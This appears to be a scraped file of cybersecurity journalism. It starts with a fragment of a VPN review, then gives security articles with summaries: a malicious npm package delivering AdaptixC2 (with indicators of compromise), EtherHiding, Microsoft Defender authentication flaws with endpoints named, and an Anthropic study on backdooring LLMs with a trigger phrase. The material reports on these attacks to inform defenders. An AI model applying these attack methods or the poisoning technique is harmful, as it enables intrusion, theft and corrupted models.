nor does it offer anonymous payment methods. Those aren't big omissions for the vast majority of users, but if you need the utmost privacy, Proton or Mullvad (below) are better options.\nSpecs\nNumber of devices:\nUnlimited\nNumber of servers:\n3,200+\nApplications:\nWindows, macOS, Linux, iOS, Android, Chrome, Firefox, Edge\nFeatures:\nKill switch, split tunneling, double-hop, ad blocker, static IP, P2P servers\nBest No-Logs VPN\nCourtesy of Mullvad VPN\nMullvad\nVPN\nShop Now\nAny VPN worth its salt claims a no-logs policy, but almost all of them keep\nsome\nlogs. Those logs shouldn't have anything to do with your browsing data, and they should be anonymized, but most VPNs need to at least keep logs of information like your email and payment method. But not Mullvad.\nMullvad doesn't do multi-year subscriptions, referral links, or social sign-on. You generate an account number to sign up, and you add time to that account with the payment method of your choice, including a credit card, PayPal, crypto, or cold, hard cash (via mail). If you want to go through the hassle, you can stay fully anonymous in the eyes of Mullvad. If that wasn't enough, Mullvad even\nclaims it was raided by Swedish police\nand still didn't produce logs.\nIt's not as fast as Proton, Windscribe, or Surfshark, but it's not bad, either—around a 24 percent drop in the US compared to 19 percent with Surfshark—and it lacks some features like port forwarding. But the pricing is good at roughly $6 a month, depending on exchange rates (Mullvad charges a flat €5 regardless of location).\nMullvad is on the bleeding edge of privacy, too, building RAM-only servers starting in 2022 and introducing\ndefense against AI-guided traffic analysis (DAITA)\nlast year. DAITA protects against AI traffic analysis, introducing network noise and sending consistent packet sizes to obfuscate your encrypted traffic further.\nSpecs\nNumber of devices:\n5\nNumber of servers:\n700+\nApplications:\nWindows, macOS, Linux, iOS, Android\nFeatures:\nKill switch, split tunneling, DAITA, double-hop\nBest VPN for Multiple Devices\nCourtesy of ExpressVPN\nExpressVPN\nAdvanced\n$126\nExpressVPN (2 Years)\n$90\nExpressVPN (Yearly)\n$14\nExpressVPN (Monthly)\nExpressVPN has had a rough few years, but it finally seems like the company is on solid footing. It was purchased a few years back for almost $1 billion by Kape Technologies—a firm that owns several VPNs, including CyberGhost and Private Internet Access. A revolving door of executives followed the sale, but ExpressVPN's leadership is solid enough now that it's worth recommending.\nThat's because the service itself hasn't degraded in the past few years. ExpressVPN is still insanely fast, packed with features, and dead-simple to use across desktop and mobile. It can go toe-to-toe with the top dogs, and it's always been able to. That hasn't changed. However, I'm recommending it here due to recent changes ExpressVPN made to its membership options. Its core service is still intact, offering 10 simultaneous connections and full access to the ExpressVPN network. You can push higher, though, with the Advanced plan offering 12 connections and the Pro planning offering 14. The Advanced plan is best for most people, not only due to the higher connection limit but also because it comes with a password manager and\n50 percent off one of ExpressVPN’s AirCove routers\n.\nSpecs\nNumber of devices:\n12\nNumber of servers:\nUnknown (105+ locations)\nApplications:\nWindows, macOS, Linux, iOS, Android, Chrome, Firefox, Edge, Google TV, Apple TV\nExpressVPN Features:\nKill switch, split tunneling, ad blocker\nVPNs, Compared\nProton VPN\nNordVPN\nWindscribe\nSurfshark\nMullvad\nExpressVPN\nNumber of devices\n10\n10\nUnlimited\nUnlimited\n5\n14\nNumber of locations\n120+\n165+\n69+\n100+\n49+\n105+\nP2P support\nYes\nYes\nYes\nYes\nYes\nYes\nKill switch\nYes\nYes\nYes\nYes\nYes\nYes\nSplit tunneling\nYes\nYes\nYes\nYes\nYes\nYes\nDouble hop connection\nSecure Core\nYes\nNo\nYes\nYes\nNo\nAd/tracker blocker\nNetShield\nYes\nYes\nYes\nYes (via extension)\nYes\nPacket obfuscation\nYes\nYes\nYes\nYes\nYes\nNo\nWireGuard support\nYes\nYes (NordLynx)\nYes\nYes\nYes\nYes (Lightway)\nOther VPNs We’ve Tested\nEventVPN\nis the new hotness in the VPN world. It's a free, ad-supported VPN that comes from ExpressVPN. Ads and VPNs don't really mix, but EventVPN says it's able to offer a free service via Apple's App Tracking Transparency (ATT) and Identifier for Advertisers (IDFA), basically allowing it to serve ads without harvesting your personal data. The problem is the pervasiveness of ads. A banner lives at the top of the app at all times, and you'll need to sit through a 30-second ad each time you connect or disconnect; a big problem when some servers posted unreasonably slow speeds. I'll admit that EventVPN is a unique concept, but I see nothing about it that's better than ProtonVPN or Windscribe for a free VPN service. And when it comes to the inconvenience of sitting through ads, it's straight-up worse.\nPrivate Internet Access (PIA)\nhas a long history in the VPN space, and it's maintained a track record of defending user privacy—even in the face of actual criminal activity. In 2016, a criminal complaint was filed in Florida against Preston Alexander McWaters for threats made online. McWaters was eventually convicted and\nsentenced to 42 months in prison\n. Investigators traced the online threats back to PIA's servers and subpoenaed the company. As\nthe complaint reads\n, “A subpoena was sent to [Private Internet Access] and the only information they could provide is that the cluster of IP addresses being used was from the east coast of the United States.” McWaters engaged in several other identifying activities, according to the complaint, but PIA wasn't among them. Despite such a clear view of a VPN provider upholding its no-logging policy, PIA didn't impress me during my tests. It's slightly more expensive than a lot of our top picks, and it delivered the worst speeds out of any VPN I tested, with more than a 50 percent drop on the closest US server. (Windscribe, for context, only dropped 15.6 percent of my speed.)\nMysteriumVPN\nis the go-to dVPN, or decentralized VPN, as far as I can tell. The concept of a decentralized VPN has existed for a while, but it's really gained traction over the last couple of years. The idea is to have a network of residential IP addresses that make up the network, routing your traffic through normal IP addresses to get around the increasingly common block lists for VPN servers. Mysterium accomplishes this network with MystNodes. It's a crypto node. People buy the node to earn crypto, and they're put into the Mysterium network. It's not inherently bad, but routing your traffic through a single residential IP is a little worrisome. Even without the decentralized kick, Mysterium was slow, and it doesn't maintain any sort of privacy materials, be it a third-party audit, warranty canary, or transparency report.\nPrivadoVPN\nis one of the popular options to recommend as a free VPN. It offers a decent free service, with a handful of full-speed servers and 10 GB of data per month. You'll have to suffer through four—yes, four—redirects begging you to pay for a subscription before signing up, but the free plan works. The problem is how new PrivadoVPN is. There's no transparency report or audit available, and although the speeds are decent, they aren't as good as Proton, Windscribe, or Surfshark. PrivadoVPN isn't bad, but it's hard to recommend when Proton and Windscribe exist with free plans that are equally as good.\nVPNs to Avoid\nYou'll find dozens of free VPNs all claiming to protect your privacy. Most of them don't. There are plenty of VPNs I don’t recommend, but these are a few I've tested worth mentioning.\nHola\nis an infamous name in the VPN industry, but it's been close to a decade since its very public debacle. Hola is free, and it's able to stay free because it uses a peer-to-peer network. Hola also owns Bright Data (formerly Luminati), which is a data collection company. In 2015, Hola sold access to the network of its free users (via Luminati), which was used in a distributed denial-of-service attack on 8chan. It's been a decade since that incident, but Hola still operates in a similar way. If you don't pay, you could be used as an exit node in Bright Data's network, and the privacy policy makes it clear that Hola logs data about your usage, including your IP address, the pages you visit, and timestamps.\nX-VPN\nis available on desktop, but it primarily shows up in results on the Apple App Store and Google Play, targeting mobile users with a free offering. X-VPN hasn't done anything explicitly wrong like Hola, but it has way too many inconsistencies to recommend. For starters, it uses a proprietary VPN protocol, which it obfuscates within the app. Proprietary protocols like NordVPN's NordLynx and ExpressVPN's Lightway are based on existing, open source protocols. Further, X-VPN was\nhighlighted in a Tech Transparency Project report\nabout free VPNs with links to the Chinese government; X-VPN is based in Hong Kong. There's no smoking gun with X-VPN, but there doesn't need to be. The speeds aren't the best, the app lacks basic features like split tunneling, and the pricing for a paid plan is in line with top providers.\nHow We Test VPNs\nFunctionally, a VPN should do two things: keep your internet speed reasonably fast, and actually protect your browsing data. That's where I focused my testing. Extra features, a comfy UI, and customization settings are great, but they don't matter if the core service is broken.\nSpeed testing requires spot-checking, as the time of day, the network you're connected to, and the specific VPN server you're using can all influence speeds. Because of that, I always set a baseline speed on my unprotected connection directly before recording results, and I ran the test three times across both US and UK servers. With those baseline drops, I spot-checked at different times of the day over the course of a week to see if the speed decrease was similar.\nSecurity is a bit more involved. For starters, I checked for DNS, WebRTC, and IP leaks every time I connected to a server using Browser Leaks. I also ran brief tests sniffing my connection with\nWireshark\nto ensure all of the packets being sent were secured with the VPN protocol in use.\nOn the privacy front, the top-recommended services included on this list have been independently audited, and they all maintain some sort of transparency report. In most cases, there's a proper report, but in others, such as Windscribe, that transparency is exposed through legal proceedings.\nPower up with unlimited access to\nWIRED\n.\nGet best-in-class reporting and exclusive subscriber content that's too important to ignore.\nSubscribe Today\n.\nComments\nBack to top\nTriangle\nJacob Roach\nis a product writer and reviewer at WIRED, focused on software as a service (SaaS) products, including VPNs, password managers, cloud storage, and antivirus applications.

      "content": "Cybercriminals are abusing a widespread lack of authentication in the customer service platformZendeskto flood targeted email inboxes with menacing messages that come from hundreds of Zendesk corporate customers simultaneously.Zendesk is an automated help desk service designed to make it simple for people to contact companies for customer support issues. Earlier this week, KrebsOnSecurity started receiving thousands of ticket creation notification messages through Zendesk in rapid succession, each bearing the name of different Zendesk customers, such asCapCom,CompTIA,Discord,GMAC,NordVPN,The Washington Post, andTinder.The abusive missives sent via Zendesk’s platform can include any subject line chosen by the abusers. In my case, the messages variously warned about a supposed law enforcement investigation involving KrebsOnSecurity.com, or else contained personal insults.Moreover, the automated messages that are sent out from this type of abuse all come from customer domain names — not from Zendesk. In the example below, replying to any of the junk customer support responses from The Washington Post’s Zendesk installation shows the reply-to address is help@washpost.com.One of dozens of messages sent to me this week by The Washington Post.Notified about the mass abuse of their platform, Zendesk said the emails were ticket creation notifications from customer accounts that configured their Zendesk instance to allow anyone to submit support requests — including anonymous users.“These types of support tickets can be part of a customer’s workflow, where a prior verification is not required to allow them to engage and make use of the Support capabilities,” saidCarolyn Camoens, communications director at Zendesk. “Although we recommend our customers to permit only verified users to submit tickets, some Zendesk customers prefer to use an anonymous environment to allow for tickets to be created due to various business reasons.”Camoens said requests that can be submitted in an anonymous manner can also make use of an email address of the submitter’s choice.“However, this method can also be used for spam requests to be created on behalf of third party email addresses,” Camoens said. “If an account has enabled the auto-responder trigger based on ticket creation, then this allows for the ticket notification email to be sent from our customer’s accounts to these third parties. The notification will also include the Subject added by the creator of these tickets.”Zendesk claims it uses rate limits to prevent a high volume of requests from being created at once, but those limits did not stop Zendesk customers from flooding my inbox with thousands of messages in just a few hours.“We recognize that our systems were leveraged against you in a distributed, many-against-one manner,” Camoens said. “We are actively investigating additional preventive measures. We are also advising customers experiencing this type of activity to follow our general security best practices and configure an authenticated ticket creation workflow.”In all of the cases above, the messaging abuse would not have been possible if Zendesk customers validated support request email addresses prior to sending responses. Failing to do so may make it easier for Zendesk clients to handle customer support requests, but it also allows ne’er-do-wells to sully the sender’s brand in service of disruptive and malicious email floods.",
      "summary": "The recent exploit targeting Zendesk customers highlights a critical vulnerability in their authentication process, which allowed cybercriminals to abuse the platform for sending mass emails with menacing messages from numerous corporate customer domains simultaneously. This attack not only disrupted the legitimate use of Zendesk's support requests but also posed a risk to the integrity and reputation of these companies by using their domains as senders. Zendesk, while acknowledging that some customers prefer an anonymous environment, did not implement adequate safeguards against such abuse. The lack of authentication checks facilitated this mass email bombing attack, demonstrating a significant gap in security practices within the customer base.

      "content": "Incident descriptionThe first version of the AdaptixC2 post-exploitation framework, which can be considered an alternative to the well-known Cobalt Strike, was made publicly available in early 2025. In spring of 2025, the framework wasfirst observedbeing used for malicious means.In October 2025, Kaspersky experts found that the npm ecosystem contained a malicious package with a fairly convincing name:https-proxy-utils. It was posing as a utility for using proxies within projects. At the time of this post, the package had already been taken down.The name of the package closely resembles popular legitimate packages:http-proxy-agent, which has approximately 70 million weekly downloads, andhttps-proxy-agentwith 90 million downloads respectively. Furthermore, the advertised proxy-related functionality was cloned from another popular legitimate packageproxy-from-env, which boasts 50 million weekly downloads. However, the threat actor injected a post-install script intohttps-proxy-utils, which downloads and executes a payload containing the AdaptixC2 agent.Metadata for the malicious (left) and legitimate (right) packagesOS-specific adaptationThe script includes various payload delivery methods for different operating systems. The package includes loading mechanisms for Windows, Linux, and macOS. In each OS, it uses specific techniques involving system or user directories to load and launch the implant.In Windows, the AdaptixC2 agent is dropped as a DLL file into the system directoryC:\\Windows\\Tasks. It is then executed viaDLL sideloading. The JS script copies the legitimatemsdtc.exefile to the same directory and executes it, thus loading the malicious DLL.Deobfuscated Windows-specific code for loading AdaptixC2In macOS, the script downloads the payload as an executable file into the user’s autorun directory:Library/LaunchAgents. Thepostinstall.jsscript also drops a plist autorun configuration file into this directory. Before downloading AdaptixC2, the script checks the target architecture (x64 or ARM) and fetches the appropriate payload variant.Deobfuscated macOS-specific code for loading AdaptixC2In Linux, the framework’s agent is downloaded into the temporary directory/tmp/.fonts-unix. The script delivers a binary file tailored to the specific architecture (x64 or ARM) and then assigns it execute permissions.Deobfuscated Linux-specific code for loading AdaptixC2Once the AdaptixC2 framework agent is deployed on the victim’s device, the attacker gains capabilities for remote access, command execution, file and process management, and various methods for achieving persistence. This both allows the attacker to maintain consistent access and enables them to conduct network reconnaissance and deploy subsequent stages of the attack.ConclusionThis is not the first attack targeting the npm registry in recent memory. A month ago, similar infection methods utilizing a post-install script were employed in thehigh-profile incidentinvolving the Shai-Hulud worm, which infected more than 500 packages.The AdaptixC2 incident clearly demonstrates the growing trend of abusing open-source software ecosystems, like npm, as an attack vector. Threat actors areincreasingly exploiting the trusted open-source supply chainto distribute post-exploitation framework agents and other forms of malware. Users and organizations involved in development or using open-source software from ecosystems like npm in their products are susceptible to this threat type.To stay safe, be vigilant when installing open-source modules: verify the exact name of the package you are downloading, and more thoroughly vet unpopular and new repositories. When using popular modules, it is critical to monitorfrequently updated feeds on compromised packages and libraries.Indicators of compromisePackage namehttps-proxy-utilsHashesDFBC0606E16A89D980C9B674385B448E– package hashB8E27A88730B124868C1390F3BC42709669BDBEF9E92C3526302CA37DC48D21FEDAC632C9B9FF2A2DA0EACAAB63627F4764C9E6B6F38DF11DC752CB071AE26F904931B7DFD123E6026B460D87D842897Network indicatorscloudcenter[.]top/sys/updatecloudcenter[.]top/macos_update_armcloudcenter[.]top/macos_update_x64cloudcenter[.]top/macosUpdate[.]plistcloudcenter[.]top/linux_update_x64cloudcenter[.]top/linux_update_arm",

Led by fugitive Chen Zhi (akaVincent), the group defrauded billions from victims through fake investment schemes disguised as romantic or business opportunities. Operating across 30+ countries, Prince Group forced trafficked workers into Cambodian compounds to run these scams under threat of violence.The organization laundered illicit gains through complex crypto transfers before converting them into cash for luxury assets, including yachts, jets, and even a Picasso painting. In coordination with the U.K., the U.S. Treasury hassanctionedZhi and 146 of his associates. Authorities, on the whole, estimate that Americans lost $16.6 billion to such scams last year, with Southeast Asian-based operations driving most of this increase.

Lanepleaded guiltyto multiple federal cybercrime charges in May.The Bad | North Korean Hackers Deploy EtherHiding to Steal CryptocurrencyNorth Korean state-sponsored hackers have begun using a novel malware-hosting method called “EtherHiding” to steal cryptocurrency, marking the first time a nation-state actor has employed thisblockchain-based technique.Researchersattribute the activity to the DPRK-linked cluster UNC5342, which has been deploying EtherHiding since February 2025 as part of its ongoing “Contagious Interview” campaign. The group uses fake job offers to lure software developers, posing as recruiters from fake companies. During technical assessments, victims are tricked into running malicious code, initiating the multi-stage infection chains.EtherHiding embeds malicious payloads withinsmart contractson public blockchains, including Ethereum and Binance Smart Chain, allowing attackers to fetch the malware via read-only calls that leave no trace of the transaction.This method provides anonymity, is resilient to takedowns, and provides the flexibility to update payloads at minimal cost, an average of $1.37 USD per update. The payloads include JADESNOW, a JavaScript downloader, andInvisibleFerret, a backdoor for credential theft,remote control, and exfiltration of cryptocurrency wallet data and browser-stored passwords.UNC5342 EtherHiding on BNB Smart Chain and Ethereum (Source: GTIG)Researchers note that the threat actor’s use of multiple blockchains suggests operational compartmentalization and makes forensic analysis more difficult. The approach demonstrates a shift towardbulletproof hosting, using blockchain technology to create takedown-resistant, flexible malware distribution.Users should exercise caution with job-related downloads and adopt best practices such astesting files in isolated environments, restricting executable file types, and enforcing strict browser policies to block script auto-execution.The Ugly | Flaws in Microsoft Defender Could Lead to Theft of DataResearchers havereportedunpatched vulnerabilities in Microsoft Defender for Endpoint (DFE) that could enable attackers to bypass authentication,spoofdata, exfiltrate sensitive information, and inject malicious files into forensic evidence collections used by security analysts.Reported to Microsoft’s Security Response Center in July 2025, the issues were categorized as low severity, with no confirmed fixes as of this writing. Researchers tracking the flaws focused on how the agent communicated with cloud backends, using tools like Burp Suite and WinDbg memory patches to bypasscertificate pinninginMsSense.exeandSenseIR.exe, allowing plaintext interception of HTTPS traffic, including Azure Blob uploads.Requests can be intercepted including data uploads to an Azure Blob (Source: InfoGuard Labs)The core problem lies in DFE requests to endpoints such as/edr/commands/cncand/senseir/v1/actions/, where Authorization tokens and headers are ignored. Low-privileged users can obtain machine and tenant IDs from the registry to impersonate the agent, intercept commands, or spoof responses such as faking an “already isolated” status while leaving devices exposed. Similarly, CloudLR tokens for Live Response and Automated Investigations are ignored, allowing payload manipulation and uploads to Azure Blob URIs.In addition, attackers can access 8MB configuration dumps without credentials, revealing detection logic likeRegistryMonitoringConfigurationand ASR rules, while investigation packages on disk can be tampered with, embedding malicious files disguised as legitimate artifacts.Despite responsible disclosure by the researchers concerned, it remains unknown whether Microsoft will patch the flaws any time soon.",

      "content": "F5’s breach triggers a CISA emergency directive, as Tenable calls it “a five-alarm fire” that requires urgent action. Meanwhile, OpenAI details how attackers try to misuse ChatGPT. Plus, boards are increasing AI and cyber disclosures. And much more!Key takeawaysA critical breach at cybersecurity firm F5, attributed to a nation-state, has triggered an urgent CISA directive for federal agencies to patch vulnerable systems immediately.A new report from OpenAI reveals that threat actors try to use ChatGPT to refine conventional attacks.As cyber attacks skyrocket, corporate boards are significantly increasing their oversight and disclosures related to both cybersecurity and AI risks.Here are five things you need to know for the week ending October 17.1 - Code red: CISA directs fed agencies to patch F5 vulnerabilitiesWhen a cybersecurity company gets hacked, it's bad. When a nation-state steals some of its most sensitive data, it’s a catastrophe.That’s what happened this week, when F5 disclosed 40-plus vulnerabilities and announced that a nation-state attacker stole proprietary, confidential information about its technology and its security research, triggering an urgent U.S. government alert.In response to F5’s announcement, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) issuedEmergency Directive ED 26-01, ordering federal agencies to inventory F5 BIG-IP products, determine if they’re exposed to the public internet, and patch them.Specifically, CISA is directing agencies to patch vulnerable F5 virtual and physical devices and downloaded software, including F5OS, BIG-IP TMOS, BIG-IQ, and BNK / CNF, by October 22, and follow the instructions in F5’s “Quarterly Security Notification.”All organizations, not just federal civilian agencies, should prioritize mitigatingthe risk from F5’s breach and vulnerabilities, which can be exploited with “alarming ease” and can lead to catastrophic compromises, CISA Acting Director Madhu Gottumukkala said in a statement.“We emphatically urge all entities to implement the actions outlined in this Emergency Directive without delay,” he said.The F5 breach is “a five-alarm fire for national security,” Tenable CSO and Head of Research Robert Huber wrote in a blog, adding that F5’s technology is foundational “to secure everything,” including government agencies and critical infrastructure.“In the hands of a hostile actor, this stolen data is a master key that could be used to launch devastating attacks, similar to the campaigns waged by Salt Typhoon and Volt Typhoon,” Huber wrote in the post “F5 BIG-IP Breach: 44 CVEs That Need Your Attention Now.”“We haven’t seen a software supply chain compromise of this scale since SolarWinds,” he added.To get all the details about the F5 breach and about how Tenable can help, read Huber’s blog, as well as the Tenable Research blog “Frequently Asked Questions About The August 2025 F5 Security Incident.”For more information about the unfolding F5 situation:“Confirmed compromise of F5 network”(U.K. National Cyber Security Centre)“F5 Hit by ‘Nation-State’ Cyberattack”(TechRepublic)“Hackers stole source code, bug details in disastrous F5 security incident – here’s everything we know and how to protect yourself”(ITPro)“Nation-state hackers breached sensitive F5 systems, stole customer data”(Cybersecurity Dive)“Source code and vulnerability info stolen from F5 Networks”(CSO)2 - OpenAI: Attackers abuse ChatGPT to sharpen old tricksCreating and refining malware. Setting up malicious command-and-control hubs. Generating multi-language phishing content. Carrying out cyber scams.Those are some of the ways in which cyber attackers and fraudsters tried to abuse ChatGPT recently, according to OpenAI’s report “Disrupting malicious uses of AI: an update.”Yet, OpenAI, which detailed seven incidents it detected and disrupted, noticed an overarching trend: Attackers aren’t trying to use ChatGPT to cook up sci-fi-level super-attacks. They’re mostly trying to put their classic scams on steroids.“We continue to seethreat actors bolt AI onto old playbooksto move faster, not gain novel offensive capability from our models,” OpenAI wrote in the report.The report identifies several key trends among threat actors:Using multiple AI modelsAdapting their techniques to hide AI usageOperating in a \"gray zone\" with requests that are not overtly maliciousIncidents detailed in the report include the malicious use of ChatGPT by:Cyber criminalsfrom Russian-speaking, Korean-language, and Chinese-language groups to refine malware, create phishing content, and debug tools.Authoritarian regimes, specifically individuals linked to the People's Republic of China (PRC), to design proposals for large-scale social media monitoring and profiling, including a system to track Uyghurs.Organized scam networks, likely based in Cambodia, Myanmar, and Nigeria, to scale fraud by translating messages and creating fake personas.State-backed influence operationsfrom Russia and China to generate propaganda, including video scripts and social media posts.“Our public reporting, policy enforcement, and collaboration with peers aim to raise awareness of abuse while improving protections for everyday users,” OpenAI wrote in the statement “Disrupting malicious uses of AI: October 2025.”For more information aboutAI security, check out these Tenable resources:“2025 Cloud AI Risk Report: Helping You Build More Secure AI Models in the Cloud”(on-demand webinar)“Cloud & AI Security at the Breaking Point — Understanding the Complexity Challenge”(solution overview)“Exposure Management in the realm of AI”(on-demand webinar)“Expert Advice for Boosting AI Security”(blog)“AI Is Your New Attack Surface”(on-demand webinar)3 - Anthropic: Poisoning giant LLMs is shockingly easyBigger isn’t better when it comes to the security of large language models (LLMs).Conventional wisdom held that bigger models were harder to poison. Well, that ain’t so, according to a study by Anthropic.The study, titled “Poisoning Attacks on LLMs Require a Near-Constant Number of Poison Samples,” found that an attacker doesn't need to control a huge percentage of an LLM’s training data. A small, fixed amount is enough to create a backdoor.“Creating 250 malicious documents is trivial compared to creating millions, making this vulnerability far more accessible to potential attackers,” reads the Anthropic article “A small number of samples can poison LLMs of any size.”If anything, data-poisoning attacks against LLMs become easier as models scale up and their datasets grow. “The attack surface for injecting malicious content expands proportionally, while the adversary’s requirements remain nearly constant,” the study reads.The study, conducted jointly with the U.K. AI Security Institute and the Alan Turing Institute, focused on a likely innocuous type of backdoor attack: Tampering with the LLM so that it generates gibberish text when a user inputs a specific phrase.The researchers inserted the trigger phrase <SUDO> into a small number of training documents. They found that while 100 poisoned documents were insufficient, 250 or more were enough to reliably create a backdoor across all tested model sizes, which ranged from 600 million to 13 billion parameters.(Source: Anthropic article “A small number of samples can poison LLMs of any size,” October 2025.)It is unclear if the study’s findings will hold for more complex behaviors, such as bypassing safety guardrails or generating malicious code.“Nevertheless, we’re sharing these findings to show that data-poisoning attacks might be more practical than believed, and to encourage further research on data poisoning and potential defenses against it,” the article reads.While the study didn’t focus on ways to defend LLMs against this type of attack, it does offer some mitigation recommendations, pointing to “clean training” practices as a way to remove backdoors in some settings.“Defences can be designed at different stages of the training pipeline such as data filtering before training and backdoor detection and elicitation once the model has been trained to detect undesired behaviours,” the study reads.For more information about protecting AI systems against cyber attacks:“Understanding the risks - and benefits - of using AI tools”(U.K. NCSC)“Hacking AI? Here are 4 common attacks on AI”(ZDNet)“Best Practices for Deploying Secure and Resilient AI Systems”(Australian Cyber Security Centre)“Adversarial attacks on AI models are rising: what should you do now?”(VentureBeat)“OWASP AI Security and Privacy Guide”(OWASP)“How to manage generative AI security risks in the enterprise”(TechTarget)4 - Report: AI and cyber risks hit the boardroomIn a sign of the growing impact of AI and cybersecurity for enterprises, Fortune 100 boards of directors have boosted the number and the substance of their AI and cybersecurity oversight disclosures.That’s the conclusion EY arrived at after analyzing proxy statements and 10-K filings submitted to the U.S. Securities and Exchange Commission (SEC) by 80 of the Fortune 100 companies in recent years.“Companies are putting the spotlight on their technology governance, signaling an increasing emphasis on cyber and AI oversight to stakeholders,” reads the EY report “Cyber and AI oversight disclosures: what companies shared in 2025.”What’s driving this trend? Cyber threats are becoming more sophisticated by the minute, while the use of generative AI — both by security teams and by attackers — is growing exponentially.Key findings from the report about AI oversight include:Nearly half (48%) of the analyzed companies now specifically mention AI risk in their board's enterprise risk oversight, a threefold increase from 2024.AI expertise on boards has also grown, with 44% of companies now mentioning AI in their description of director qualifications, up from 26% last year.40% of companies have formally assigned AI oversight to a board committee, most commonly the audit committee.The number of companies disclosing AI as a standalone risk factor has more than doubled, from 14% to 36%.Meanwhile, cybersecurity oversight practices have also matured:The vast majority of companies (78%) continue to assign this responsibility to the audit committee.There is a clear trend towards aligning with external cybersecurity frameworks, with 73% of companies now doing so, up from 57% in 2024 and from a mere 4% in 2019.Cybersecurity preparedness is also being taken more seriously, with 58% of companies now conducting simulations and tabletop exercises, compared to only 3% in 2019.The demand for directors with cybersecurity expertise remains high, with 86% of companies highlighting it as a skill that either a director has or that the board seeks.“Board oversight of these areas is critical to identifying and mitigating risks that may pose a significant threat to the company,” the report reads.For more information about cybersecurity and AI in the boardroom and the C-suite:“Governance of AI: A critical imperative for today’s boards”(Deloitte)“AI Governance In The Boardroom: Strategies For Effective Oversight And Implementation”(Forbes)“The Hidden C-Suite Risk Of AI Failures”(Harvard Law School)“How Board-Level AI Governance Is Changing”(Forbes)“Competitive advantage through cybersecurity: A board-level perspective”(McKinsey)“How AI Impacts Board Readiness for Oversight of Cybersecurity and AI Risks”(National Association of Corporate Directors)5 - NCSC: Severe cyber attacks hitting U.K. at “alarming pace”Cyber attacks with national reverberations have shot up to four per week in the U.K., a stat that’s a wake-up call not only for all British cyber defenders but also for all business leaders.That’s according to the U.K. National Cyber Security Centre’s (NCSC) 2025 annual review, titled “It’s time to act: Open your eyes to the imminent risk to your economic security” and covering the 12-month period ending in September 2025.“Cyber risk is no longer just an IT issue — it’s a boardroom priority,” reads the report.These “nationally significant” cyber incidents more than doubled, climbing to 204 from 89 in the previous 12 months.The severity of the attacks is also on the upswing. The report reveals a nearly 50% increase in \"highly significant\" incidents, which are those with the potential to severely impact the central government, essential services, many people, or the economy.“Cyber security is now a matter of business survival and national resilience,” Richard Horne, Chief Executive of the NCSC, said in a statement.“Our collective exposure to serious impacts is growing at an alarming pace,” he added.The NCSC attributes many of these attacks to sophisticated advanced persistent threat (APT) actors, including nation-states and highly capable criminal organizations. It identifies the primary state-level threats as China, Russia, Iran, and North Korea.In response to this escalating threat, the NCSC is urging British businesses to prioritize their cybersecurity measures, saying that cybersecurity “is now critical to business longevity and success.”To aid in this effort, the NCSC has launched a new \"Cyber Action Toolkit\" aimed at helping small organizations implement foundational security controls.It is also promoting the \"Cyber Essentials\" certification, which indicates an organization has security in place against most common cyber threats and opens up the opportunity to obtain free cyber insurance.",
      "summary": "The recent breach at cybersecurity firm F5 has raised significant concerns and prompted an urgent CISA directive for federal agencies to patch vulnerabilities immediately. This incident, attributed to a nation-state, marks a critical event that could lead to widespread compromises if not properly addressed. The stolen data includes proprietary information about F5's technology and security research, highlighting the potential risk of such breaches in compromising sensitive infrastructure and government operations. CISA's ED 26-01 emphasizes the urgency with which all organizations should address these vulnerabilities to prevent any catastrophic consequences.\n\n\n\nAdditionally, OpenAI has released a report detailing how attackers are attempting to exploit ChatGPT for various malicious purposes such as creating malware, setting up phishing content, and conducting cyber scams. This not only demonstrates the adaptability of threat actors in leveraging AI for nefarious activities but also underscores the need for increased oversight and disclosures regarding cybersecurity and AI risks by corporate boards.\n\n\n\nThese developments underscore the evolving landscape of cybersecurity threats, emphasizing the importance of proactive measures to protect against both traditional cyber attacks and those that leverage advanced technologies like AI.",

      "content": "Threat Intelligence Executive Report – Volume 2025, Number 5\nThis issue of the Counter Threat Unit’s high-level bimonthly report discusses noteworthy updates in the threat landscape during July and August\nWritten by\nSophos Counter Threat Unit Research Team\nOctober 17, 2025\nThreat Research\nfeatured\ninfostealer\nMFA\nmulti-factor authentication\npatching\nRansomware\nVulnerabilities\nThe Counter Threat Unit™ (CTU) research team analyzes security threats to help organizations protect their systems. Based on observations in July and August, CTU™ researchers identified the following noteworthy issues and changes in the global threat landscape:\nRansomware remains a volatile threat despite disruptions\nAbsent MFA allows exploitation of stolen credentials\nLegacy vulnerabilities maintain their value\nRansomware remains a volatile threat despite disruptions\nLaw enforcement actions have made an impact on the ransomware ecosystem but have not reduced the number of attacks.\nRansomware continues to pose a major threat to organizations. Even though the number of victims posted to leak sites has declined since reaching an all-time peak in March 2025, the figures in July and August remained higher than in the same months of 2024. Despite the amount of media attention devoted to high-profile ransomware and data extortion attacks by Scattered Spider and ShinyHunters, the two most prolific schemes during July and August were Qilin and Akira. Both schemes have been highly active during 2025 (although the number of victims posted each month is lower than the monthly volume from previous prolific operations like LockBit). Even so, overall, the high number of ransomware attacks in the second and third quarters of 2025 have mostly been more evenly distributed across multiple groups compared to previous years.\nLaw enforcement actions against major ransomware operators in 2024 and 2025 have\ncaused\nfragmentation and volatility in the ransomware landscape. Typically, each law enforcement disruption inspires a temporary spike in new group creations. Thirty-seven new schemes appeared in the first half of 2025. Four others emerged in July, followed by another four in August. The sustained high number may be linked to the regular cadence of law enforcement activity targeting LockBit throughout 2024. Several groups that had been considered dormant returned to activity during July and August 2025 too. In total, 52 ransomware schemes were active in August, a monthly volume that has only been surpassed three times in the previous two years.\nThe new schemes are likely not formed by new cybercriminals. Instead, affiliates who worked with disrupted operations may join or launch a new scheme, either pooling efforts with other displaced affiliates or working independently. New schemes may also be rebrands of older operations. Affiliates may alternatively move to established operations such as Akira that then increase their attack tempo as a result of having more resources. These rebrands and circulation of affiliates across existing or new groups can make kill chains hard to identify and attribution more difficult.\nEven though these developments can increase the overall difficulty of monitoring the ransomware ecosystem, they do not greatly change the key defenses against most ransomware attacks: prompt patching, especially of internet-facing devices; phishing-resistant multi-factor authentication (MFA); and comprehensive monitoring of endpoints and networks. In addition, it is becoming increasingly important to monitor cloud and hybrid environments for malicious activity as threat actors\npivot to the cloud\n.\nWhat You Should Do Next\nMonitor government\ninitiatives\non advancing cloud security.\nAbsent MFA allows exploitation of stolen credentials\nImplementing MFA prevents threat actors from profiting from stolen credentials.\nCTU researchers have observed multiple incidents where cybercriminals or state-sponsored threat actors obtained initial access to their victim’s environment by abusing VPN credentials. For example, the\nGOLD LEAPFROG\nthreat group abused VPN credentials in an early 2025 attack that culminated in the deployment of SafePay 